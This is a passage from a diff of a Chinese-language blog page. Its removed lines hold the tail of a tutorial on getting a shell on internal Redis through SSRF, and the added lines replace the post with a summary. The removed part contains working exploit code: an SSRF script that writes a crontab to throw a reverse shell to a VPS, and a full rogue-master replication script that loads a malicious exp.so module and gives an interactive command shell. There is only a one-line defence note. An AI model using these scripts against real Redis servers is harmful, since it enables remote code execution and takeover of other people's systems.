ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(len(requests.get(exp_uri).text))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 set crontab command</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=&#123;bport&#125;'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port,</span><br><span class="line">	bhost = bhost,</span><br><span class="line">	bport = bport</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;shell_location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	shell_location = shell_location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	) </span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 config set dir</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=config:set:dir:/var/spool/cron'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3 config set dbfilename</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#4 save</span></span><br><span class="line">_payload = <span class="string">'?scheme=&#123;scheme&#125;%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=save'</span>.format(</span><br><span class="line">	scheme = scheme,</span><br><span class="line">	ip = ip,</span><br><span class="line">	port = port</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;location&#125;&#123;payload&#125;'</span>.format(</span><br><span class="line">	vul_httpurl = vul_httpurl,</span><br><span class="line">	location = _location,</span><br><span class="line">	payload = _payload</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">print(exp_uri)</span><br><span class="line">print(requests.get(exp_uri).text)</span><br></pre></td></tr></table></figure>
-
-<p>运行这个脚本并在vps上监听2333端口，等一小会儿就能看到反弹shell的连接。</p>
-<blockquote>
-<p>注意: 当curl设置了仅允许HTTP/HTTPS，且允许302跳转的情况下，可利用302跳转进行绕过。</p>
-</blockquote>
-<h3 id="4-主从复制"><a href="#4-主从复制" class="headerlink" title="4. 主从复制"></a>4. 主从复制</h3><p>主从复制这一利用方式是由LC/BC战队队员Pavel Toporkov在zeronights 2018上提出的，<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a>。它主要是利用主节点向从节点同步数据时发送恶意RDB文件来实现getshell的。主从复制的RCE适用于以下场景:</p>
-<ul>
-<li>Redis 4.x以及5.x版本</li>
-</ul>
-<p>整个的步骤分为4步。</p>
-<p>1）<strong>将目标redis设置为slave</strong>  </p>
-<p>建立主从关系只需要在从节点操作即可，主节点不用任何操作。在这条命令执行以后，就会向主节点发送请求同步内容。解除主从关系可以执行<code>slaveof no one</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure>
-
-<p>2）<strong>设置redis的数据库文件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename exp.so</span><br></pre></td></tr></table></figure>
-
-<p>3) <strong>从master接收module</strong><br>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，实现新的Redis命令。Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。恶意的so文件可参考<a href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK" target="_blank" rel="noopener">RedisModulesSDK</a>  </p>
-<p>在这个过程当中，利用全量复制将master上的RDB文件同步到slave上，从而加载恶意so文件达到RCE的目的。因此，需要以master的身份向slave传输so文件，在弄清楚他们之间流程后，便可伪造一个假的redis服务器。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">master   &lt;------ PING  &lt;-----    slave</span><br><span class="line">master   ------&gt; +PONG -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;--- REPLCONF &lt;-----    slave</span><br><span class="line">master   -------&gt; +OK  -----&gt;    slave</span><br><span class="line">master   &lt;------ PSYNC &lt;-----    slave</span><br></pre></td></tr></table></figure>
-
-<p>对于我们而言，我们只需要关注在收到slave的请求后，如何回应它，以及在收到PSYNC后发送恶意的so文件。提出该方式的作者编写了一个脚本来发送exp.so文件数据。这里使用了网上的一个脚本。</p>
-<p>redis_slave.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CRLF = <span class="string">"\r\n"</span></span><br><span class="line">payload = open(<span class="string">"exp.so"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">exp_filename = <span class="string">"exp.so"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">	cmd = <span class="string">""</span></span><br><span class="line">	cmd += <span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd += CRLF+<span class="string">"$"</span>+str(len(x))+CRLF+x</span><br><span class="line">	cmd += CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_connect</span><span class="params">(shost,sport)</span>:</span></span><br><span class="line">	sock = socket.socket()</span><br><span class="line">	sock.connect((shost,sport))</span><br><span class="line">	<span class="keyword">return</span> sock</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(sock,cmd)</span>:</span></span><br><span class="line">	sock.send(redis_format(cmd).encode())</span><br><span class="line">	print(sock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interact_shell</span><span class="params">(sock)</span>:</span></span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">while</span> flag:</span><br><span class="line">			shell = input(<span class="string">"\033[1;32;40m[*]\033[0m "</span>)</span><br><span class="line">			shell = shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)</span><br><span class="line">			<span class="keyword">if</span> shell == <span class="string">"exit"</span> <span class="keyword">or</span> shell == <span class="string">"quit"</span>:</span><br><span class="line">				flag = <span class="literal">False</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				send(sock,<span class="string">"system.exec &#123;&#125;"</span>.format(shell))</span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span><span class="params">(mport)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> CRLF</span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	flag = <span class="literal">True</span></span><br><span class="line">	result = <span class="string">""</span></span><br><span class="line">	sock = socket.socket()</span><br><span class="line">	sock.bind((<span class="string">"0.0.0.0"</span>, mport))</span><br><span class="line">	sock.listen(<span class="number">10</span>)</span><br><span class="line">	clientSock, address = sock.accept()</span><br><span class="line">	<span class="keyword">while</span> flag:</span><br><span class="line">		data = clientSock.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"PING"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+PONG"</span>+CRLF</span><br><span class="line">			clientSock.send(result.encode())</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"REPLCONF"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+OK"</span>+CRLF</span><br><span class="line">			clientSock.send(result.encode())</span><br><span class="line">			flag = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">"PSYNC"</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">"SYNC"</span> <span class="keyword">in</span> data:</span><br><span class="line">			result = <span class="string">"+FULLRESYNC "</span>+<span class="string">"a"</span>*<span class="number">40</span>+<span class="string">" 1"</span>+CRLF</span><br><span class="line">			result += <span class="string">"$"</span>+str(len(payload))+CRLF</span><br><span class="line">			result = result.encode()</span><br><span class="line">			result += payload</span><br><span class="line">			result += CRLF.encode()</span><br><span class="line">			clientSock.send(result)</span><br><span class="line">			flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	mhost = <span class="string">"docker.for.mac.host.internal"</span></span><br><span class="line">	mport = <span class="number">6380</span></span><br><span class="line">	shost = <span class="string">"127.0.0.1"</span></span><br><span class="line">	sport = <span class="number">6379</span></span><br><span class="line">	passwd = <span class="string">""</span></span><br><span class="line">	redis_sock = redis_connect(shost,sport)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> passwd:</span><br><span class="line">		send(redis_sock,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">	send(redis_sock,<span class="string">"SLAVEOF &#123;&#125; &#123;&#125;"</span>.format(mhost,mport))</span><br><span class="line">	send(redis_sock,<span class="string">"config set dbfilename &#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">	time.sleep(<span class="number">2</span>)</span><br><span class="line">	RogueServer(mport)</span><br><span class="line">	send(redis_sock,<span class="string">"MODULE LOAD ./&#123;&#125;"</span>.format(exp_filename))</span><br><span class="line">	interact_shell(redis_sock)</span><br></pre></td></tr></table></figure>
-
-<p>在SSRF的场景中，只能通过url请求访问到内网Redis的情况下，不能直接使用脚本，而是将其中的1）2）4）命令配合其他协议执行，然后在vps上启动Redis_Rogue_Server.py。</p>
-<blockquote>
-<p>在这个过程中master一定要回复全量复制。因为增量复制时，slave向master发送的runid和offset对应的情况下，会进行数据同步，但不会传输RDB文件。</p>
-</blockquote>
-<p>4）<strong>加载模块</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module load .&#x2F;exp.so</span><br></pre></td></tr></table></figure>
-
-<p>在加载模块结束后，执行<code>system.exec command</code>即可执行任意命令。</p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
-<li>在不影响业务的情况下，仅允许HTTP/HTTPS协议，且禁止302跳转。</li>
-</ul>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li>浅谈Redis中SSRF的利用<a href="https://xz.aliyun.com/t/5665#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-13</a></li>
-<li>Docker提供的指向宿主机的DNS<a href="https://nyan.im/posts/3981.html" target="_blank" rel="noopener">https://nyan.im/posts/3981.html</a></li>
-<li>Redis未授权shell利用方式分析<a href="http://blog.leanote.com/post/snowming/2d9a2082c02b" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></li>
-</ul>
-
+          <p>Redis是常见的内网服务，因其默认配置未授权访问或使用弱口令认证，可以导致getshell。这篇文章通过实验的方式介绍了四种内网Redis Getshell的方式。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/17/SSRF-Redis/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -995,7 +949,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
